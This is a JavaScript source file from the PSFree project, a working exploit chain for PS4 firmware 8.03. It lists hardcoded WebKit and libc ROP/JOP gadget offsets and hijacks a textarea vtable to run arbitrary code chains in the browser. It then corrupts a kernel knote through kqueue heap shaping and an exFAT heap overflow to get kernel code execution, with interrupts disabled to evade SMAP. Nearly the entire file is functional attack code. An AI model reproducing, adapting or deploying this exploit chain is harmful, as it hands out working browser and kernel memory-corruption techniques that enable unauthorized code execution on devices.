/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { debug_log, align, die } from './module/utils.mjs';
import { Addr, mem } from './module/mem.mjs';
import { KB, MB } from './module/constants.mjs';
import { ChainBase } from './module/chain.mjs';

import {
    make_buffer,
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from './module/memtools.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];

const offset_func_exec = 0x18;
const offset_textarea_impl = 0x18;
const offset_js_inline_prop = 0x10;

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x8d8;
const offset_wk_strlen = 0x918;

// libSceLibcInternal offsets
const offset_libc_setjmp = 0x258f4;
const offset_libc_longjmp = 0x29c58;

// see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
//
// int setjmp(jmp_buf)
// noreturn longjmp(jmp_buf)
//
// This version of longjmp() does not take another argument to be used as
// setjmp()'s return value. Offset 0 of the jmp_buf will be the restored
// rax. Change it if you want a specific value from setjmp() after the
// longjmp().
const jmp_buf_size = 0xc8;
let setjmp_addr = null;
let longjmp_addr = null;

// libSceNKWebKit.sprx
let libwebkit_base = null;
// libkernel_web.sprx
let libkernel_base = null;
// libSceLibcInternal.sprx
let libc_base = null;

// gadgets for the JOP chain
const kjop1 = `
mov rdi, qword ptr [rdi]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0xe0]
`;
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
//
// When the scrollLeft getter native function is called on PS4 8.03, rsi is the
// JS wrapper for the WebCore textarea class.
const ta_jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
//
// ta_jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by ta_jop1.
//
// This will make pivoting back easy, just "leave; ret".
const ta_jop2 = `
pop rsi
jmp qword ptr [rax + 0x5f]
`;
const ta_jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x68]
`;
// jop1 was previously used by the old implementation of Chain803, now unused
const jop1 = `
mov rdi, qword ptr [rdi + 0x30]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 8]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// the ps4 firmware is compiled to use rbp as a frame pointer
//
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const rop_epilogue = 'leave; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000035a1b,
    'pop rbx; ret' : 0x000000000001537c,
    'pop rcx; ret' : 0x0000000000025ecb,
    'pop rdx; ret' : 0x0000000000060f52,

    'pop rbp; ret' : 0x00000000000000b6,
    'pop rsi; ret' : 0x000000000003bd77,
    'pop rdi; ret' : 0x00000000001e3f87,
    'pop rsp; ret' : 0x00000000000bf669,

    'pop r8; ret' : 0x0000000000097442,
    'pop r9; ret' : 0x00000000006f501f,
    'pop r10; ret' : 0x0000000000060f51,
    'pop r11; ret' : 0x0000000000d2a629,

    'pop r12; ret' : 0x0000000000d8968d,
    'pop r13; ret' : 0x00000000016ccff1,
    'pop r14; ret' : 0x000000000003bd76,
    'pop r15; ret' : 0x00000000002499df,

    'ret' : 0x0000000000000032,
    'leave; ret' : 0x0000000000291fd7,

    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
    'adc esi, esi; ret' : 0x000000000088cbb9,
    'add rax, rdx; ret' : 0x00000000003cd92c,
    'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,

    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
    'mov dword ptr [rdi], eax; ret' : 0x000000000001f864,
    'mov rdx, rcx; ret' : 0x0000000000eae9fd,
    'mov qword ptr [rdx], rax; mov al, 1; ret' : 0x00000000000b6dcf,
    'mov rdx, qword ptr [rcx]; ret' : 0x0000000000182bc4,

    'cli; ret' : 0x00000000004b95fc,
    'sti; ret' : 0x00000000004b94c8,
    'xchg rbp, rax; ret' : 0x000000000218ef60,

    [kjop1] : 0x00000000010da705,

    [jop1] : 0x000000000028a8d0,
    [jop2] : 0x000000000076b970,
    [jop3] : 0x0000000000202698,
    [jop4] : 0x00000000021af6ad,

    [ta_jop1] : 0x00000000005efb14,
    [ta_jop2] : 0x0000000002198221,
    [ta_jop3] : 0x00000000014ff7a2,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'neg rax; ret' : 0x00000000000d3503,
    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
    'setjmp' : offset_libc_setjmp,
    'longjmp' : offset_libc_longjmp,
}));

const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    const stack_chk_fail_import =
        libwebkit_base
        .add(offset_wk_stack_chk_fail)
    ;
    const stack_chk_fail_addr = resolve_import(
        stack_chk_fail_import,
        true,
        true
    );
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import, true, true);
    const libc_base = find_base(strlen_addr, true, true);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain803Base extends ChainBase {
    constructor() {
        super();

        // for conditional jumps
        this._clean_branch_ctx();
        this.flag = new Uint8Array(8);
        this.flag_addr = get_view_vector(this.flag);
        this.jmp_target = new Uint8Array(0x100);
        rw.write64(this.jmp_target, 0x50, this.get_gadget(jop4));
        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));

        // for save/restore
        this.is_saved = false;
        const jmp_buf_size = 0xc8;
        this.jmp_buf = new Uint8Array(jmp_buf_size);
        this.jmp_buf_p = get_view_vector(this.jmp_buf);
    }

    // sequence to pivot back and return
    push_end() {
        this.push_gadget(rop_epilogue);
    }

    check_is_branching() {
        if (this.is_branch_ctx) {
            throw Error('chain is still branching, end it before running');
        }
    }

    push_value(value) {
        super.push_value(value);

        if (this.is_branch_ctx) {
            this.branch_position += 8;
        }
    }

    _clean_branch_ctx() {
        this.is_branch_ctx = false;
        this.branch_position = null;
        this.delta_slot = null;
        this.rsp_slot = null;
        this.rsp_position = null;
    }

    clean() {
        super.clean();
        this._clean_branch_ctx();
        this.is_saved = false;
    }

    // Use start_branch() and end_branch() to delimit a ROP chain that will
    // conditionally execute. rax must be set accordingly before the branch.
    // rax == 0 means execute the conditional chain.
    //
    // example that always execute the conditional chain:
    //     chain.push_gadget('mov rax, 0; ret');
    //     chain.start_branch();
    //     chain.push_gadget('pop rbx; ret'); // always executed
    //     chain.end_branch();
    start_branch() {
        if (this.is_branch_ctx) {
            throw Error('chain already branching, end it first');
        }

        // clobbers rax, rcx, rdi, rsi
        //
        // u64 flag = 0 if -rax == 0 else 1
        // *flag_addr = flag
        this.push_gadget('pop rcx; ret');
        this.push_constant(-1);
        this.push_gadget('neg rax; ret');
        this.push_gadget('pop rsi; ret');
        this.push_constant(0);
        this.push_gadget('adc esi, esi; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rsi; ret');

        // clobbers rax, rcx, rdi
        //
        // rax = *flag_addr
        // rcx = delta
        // rax = -rax & rcx
        // *flag_addr = rax
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // dummy value, overwritten later by end_branch()
        this.push_gadget('pop rcx; ret');
        this.delta_slot = this.position;
        this.push_constant(0);

        this.push_gadget('neg rax; and rax, rcx; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rax, rcx, rdx, rsi
        //
        // rcx = rsp_position
        // rsi = rsp
        // rcx += rsi
        // rdx = rcx
        //
        // dummy value, overwritten later at the end of start_branch()
        this.push_gadget('pop rcx; ret');
        this.rsp_slot = this.position;
        this.push_constant(0);

        this.push_gadget('pop rsi; ret');
        this.push_value(this.stack_addr.add(this.position + 8));

        // rsp collected here, start counting how much to perturb rsp
        this.branch_position = 0;
        this.is_branch_ctx = true;

        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
        this.push_gadget('mov rdx, rcx; ret');

        // clobbers rax
        //
        // rax = *flag_addr
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // clobbers rax
        //
        // rax += rdx
        // new_rsp = rax
        this.push_gadget('add rax, rdx; ret');

        // clobbers rdi
        //
        // for debugging, save new_rsp to flag_addr so we can verify it later
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rdx, rcx
        //
        // rdx = rax
        this.push_gadget('pop rcx; ret');
        this.push_constant(0);
        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');

        // clobbers rax, rdx, rdi, rsp
        //
        // rsp = rdx
        this.push_gadget('pop rax; ret');
        this.push_value(get_view_vector(this.jmp_target));
        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
        this.push_constant(0); // padding for the push

        this.rsp_position = this.branch_position;
        rw.write64(this.stack, this.rsp_slot, new Int(this.rsp_position));
    }

    end_branch() {
        if (!this.is_branch_ctx) {
            throw Error('can not end nonbranching chain');
        }

        const delta = this.branch_position - this.rsp_position;
        rw.write64(this.stack, this.delta_slot, new Int(delta));
        this._clean_branch_ctx();
    }

    // clobbers rax, rdi, rsi
    push_save() {
        if (this.is_saved) {
            throw Error('restore first before saving again');
        }
        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
        this.is_saved = true;
    }

    // Force a push_restore() if at runtime you can ensure the save/restore
    // pair line up.
    push_restore(is_force=false) {
        if (!this.is_saved && !is_force) {
            throw Error('save first before restoring');
        }
        // modify jmp_buf.rsp
        this.push_gadget('pop rax; ret');
        const rsp_slot = this.position;
        // dummy value, overwritten later at the end of push_restore()
        this.push_constant(0);
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x38));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // modify jmp_buf.return_address
        this.push_gadget('pop rax; ret');
        this.push_value(this.get_gadget('ret'));
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x80));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);

        // Padding as longjmp() pushes the rdi and return address in the
        // jmp_buf at the target rsp.
        this.push_constant(0);
        this.push_constant(0);
        const target_rsp = this.stack_addr.add(this.position);

        rw.write64(this.stack, rsp_slot, target_rsp);
        this.is_saved = false;
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    call(...args) {
        if (this.position !== 0) {
            throw Error('call() needs an empty chain');
        }
        this.push_call(...args);
        this.push_get_retval();
        this.push_end();
        this.run();
        this.clean();
    }

    syscall(...args) {
        if (this.position !== 0) {
            throw Error('syscall() needs an empty chain');
        }
        this.push_syscall(...args);
        this.push_get_retval();
        this.push_end();
        this.run();
        this.clean();
    }
}

// Chain for PS4 8.03
class Chain803 extends Chain803Base {
    constructor() {
        super();

        const textarea = document.createElement('textarea');
        this.textarea = textarea;
        const js_ta = mem.addrof(textarea);
        const webcore_ta = js_ta.readp(0x18);
        this.webcore_ta = webcore_ta;
        // Only offset 0x1c8 will be used when calling the scrollLeft getter
        // native function (our tests don't crash).
        //
        // This implies we don't need to know the exact size of the vtable and
        // try to copy it as much as possible to avoid a crash due to missing
        // vtable entries.
        //
        // So the rest of the vtable are free for our use.
        const vtable = new Uint8Array(0x200);
        const old_vtable_p = webcore_ta.readp(0);
        this.vtable = vtable;
        this.old_vtable_p = old_vtable_p;

        // 0x1c8 is the offset of the scrollLeft getter native function
        rw.write64(vtable, 0x1c8, this.get_gadget(ta_jop1));
        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
        rw.write64(vtable, 0x5f, this.get_gadget(ta_jop3));

        // for the JOP chain
        const rax_ptrs = new Uint8Array(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        this.rax_ptrs = rax_ptrs;

        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x68, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
        // value to pivot rsp to
        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);

        const jop_buffer = new Uint8Array(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        this.jop_buffer = jop_buffer;

        rw.write64(jop_buffer, 0, rax_ptrs_p);

        rw.write64(vtable, 8, jop_buffer_p);
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this.check_is_branching();

        // change vtable
        this.webcore_ta.write64(0, get_view_vector(this.vtable));
        // jump to JOP chain
        this.textarea.scrollLeft;
        // restore vtable
        this.webcore_ta.write64(0, this.old_vtable_p);
    }
}
const Chain = Chain803;

function init(Chain) {
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
    debug_log('syscall_array:');
    debug_log(syscall_array);
    Chain.init_class(gadgets, syscall_array);
}

function test_rop(Chain) {
    const jmp_buf = new Uint8Array(jmp_buf_size);
    const jmp_buf_p = get_view_vector(jmp_buf);

    init(Chain);

    setjmp_addr = gadgets.get('setjmp');
    longjmp_addr = gadgets.get('longjmp');

    const chain = new Chain();
    // Instead of writing to the jmp_buf, set rax here so it will be restored
    // as the return value after the longjmp().
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);
    chain.push_call(setjmp_addr, jmp_buf_p);

    chain.start_branch();

    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_call(longjmp_addr, jmp_buf_p);

    chain.end_branch();

    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_end();

    // The ROP chain is a noop. If we crashed, then we did something wrong.
    alert('chain run');
    debug_log('test call setjmp()/longjmp()');
    chain.run()
    alert('returned successfully');
    debug_log('returned successfully');
    debug_log('jmp_buf:');
    debug_log(jmp_buf);
    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);

    const state1 = new Uint8Array(8);
    debug_log('test if rax == 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state1));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(0);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.run();
    debug_log(`state1 must be 1: ${state1}`);
    if (state1[0] !== 1) {
        die('if branch not taken');
    }

    const state2 = new Uint8Array(8);
    debug_log('test if rax != 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state2));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.run();
    debug_log(`state2 must be 2: ${state2}`);
    if (state2[0] !== 2) {
        die('if branch taken');
    }

    debug_log('test syscall getuid()');
    chain.clean();
    // Set the return value to some random value. If the syscall worked, then
    // it will likely change.
    const magic = 0x4b435546;
    rw.write32(chain._return_value, 0, magic);

    chain.syscall('getuid');

    debug_log(`return value: ${chain.return_value}`);
    if (chain.return_value.low() === magic) {
        die('syscall getuid failed');
    }
}

function mlock_gadgets(gadgets) {
    const chain = new Chain();

    for (const [gadget, addr] of gadgets) {
        // amd64 instructions can be up to 15 bytes in length
        chain.push_syscall('mlock', addr, 0x10);
    }
    chain.push_end();
    chain.run();
    chain.clean();
}

function mlock_kchain(kchain) {
    const chain = new Chain();
    const stack_buffer = kchain.stack_buffer;
    const stack_buffer_p = get_view_vector(new Uint8Array(stack_buffer));
    // have a view point to the buffer of stack_buffer
    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
}

function prepare_knote(kchain) {
    const chain = new Chain();
    const size = 0x4000 * 4;

    chain.syscall('mmap', 0x4000, size, 3, 0x1010, 0xffffffff, 0);
    const knote = new Addr(chain.return_value);

    debug_log(`knote addr: ${knote}`);
    if ((knote.low() !== 0x4000) && (knote.high() !== 0)) {
        die('mmap failed');
    }

    const filterops = knote.add(0x4000);
    const jop_buffer = knote.add(0x8000);
    const rax_ptrs = knote.add(0xc000);

    const offset_kn_fop = 0x68;
    knote.write64(0, jop_buffer);
    knote.write64(offset_kn_fop, filterops);

    const offset_f_detach = 0x10;
    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));

    jop_buffer.write64(0, rax_ptrs);

    // for the kernel JOP chain
    rax_ptrs.write64(0xe0, kchain.get_gadget(jop2));
    rax_ptrs.write64(0x30, kchain.get_gadget(jop3));
    rax_ptrs.write64(0x10, kchain.get_gadget(jop4));
    rax_ptrs.write64(0, kchain.get_gadget(jop5));
    // value to pivot rsp to
    rax_ptrs.write64(0x18, kchain.stack_addr);

    // offset relative to the return address
    // kqueue_close() epilogue
    const offset_kqueue_close_epi = 436;

    kchain.push_save();

    // prevent the ghetto SMAP from catching us
    kchain.push_gadget('cli; ret');

    // get kernel stack pointer
    kchain.push_gadget('xchg rbp, rax; ret');
    kchain.push_get_retval();

    // ret_addr = *rbp
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
    // ret_addr += offset_kqueue_close_epi
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_kqueue_close_epi);
    kchain.push_gadget('add rax, rdx; ret');
    // modify return address to jump to the epilogue
    // *rbp = ret_addr
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(kchain.retval_addr);
    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');

    kchain.push_restore();
    // Small chance the ghetto SMAP catches us lacking since we haven't pivoted
    // rsp back to a kernel address.
    kchain.push_gadget('sti; ret');
    kchain.push_end();

    chain.syscall('mlock', knote, size);
}

// malloc/free until the heap is shaped in a certain way, such that the exFAT
// heap oveflow bug overwrites a knote
function trigger_oob(kchain) {
    const chain = new Chain();

    const num_kqueue = 0x1b0;
    const kqueues = new Uint32Array(num_kqueue);
    const kqueues_p = get_view_vector(kqueues);

    for (let i = 0; i < num_kqueue; i++) {
        chain.push_syscall('kqueue');
        chain.push_gadget('pop rdi; ret');
        chain.push_value(kqueues_p.add(i * 4));
        chain.push_gadget('mov dword ptr [rdi], eax; ret');
    }
    chain.push_end();
    chain.run();
    chain.clean();

    const AF_INET = 2;
    const SOCK_STREAM = 1;
    // socket file descriptor
    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
    const sd = chain.return_value;
    // pOOBs4 wasn't checking the upper 32 bits of the Int but they probably
    // meant to. They probably want 0x100 <= sd < 0x200 and not allow something
    // like sd == 0x1_0000_0100.
    //
    // We suspect why they want a specific file descriptor is because
    // kqueue_expand() allocates memory whose size depends on the file
    // descriptor number.
    //
    // The specific malloc size is probably a part in their method in shaping
    // the heap.
    if (sd.low() < 0x100 || sd.low() >= 0x200 || sd.high() !== 0) {
        die(`invalid socket: ${sd}`);
    }
    debug_log(`socket descriptor: ${sd}`);

    // spray kevents
    const kevent = new Uint8Array(0x20);
    const kevent_p = get_view_vector(kevent);
    kevent_p.write64(0, sd);
    // EV_ADD and EVFILT_READ
    kevent_p.write32(0x8, 0x1ffff);
    kevent_p.write32(0xc, 0);
    kevent_p.write64(0x10, Int.Zero);
    kevent_p.write64(0x18, Int.Zero);

    for (let i = 0; i < num_kqueue; i++) {
        // nchanges == 1, everything else is NULL/0
        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
    }
    chain.push_end();
    chain.run();
    chain.clean();

    // fragment memory
    for (let i = 18; i < num_kqueue; i += 2) {
        chain.push_syscall('close', kqueues[i]);
    }
    chain.push_end();
    chain.run();
    chain.clean();

    // trigger OOB
    alert('insert USB');

    // trigger corrupt knote
    for (let i = 1; i < num_kqueue; i += 2) {
        chain.push_syscall('close', kqueues[i]);
    }
    chain.push_end();
    chain.run();
    chain.clean();
}

function kexploit() {
    init(Chain);
    const kchain = new Chain();

    mlock_gadgets(gadgets);
    mlock_kchain(kchain);
    prepare_knote(kchain);
    trigger_oob(kchain);

    const kretval = kchain.return_value;
    debug_log(`kchain retval: ${kretval}`);
    if (kretval.low() === 0 && kretval.high() === 0) {
        die('heap overflow failed');
    }
}

kexploit();
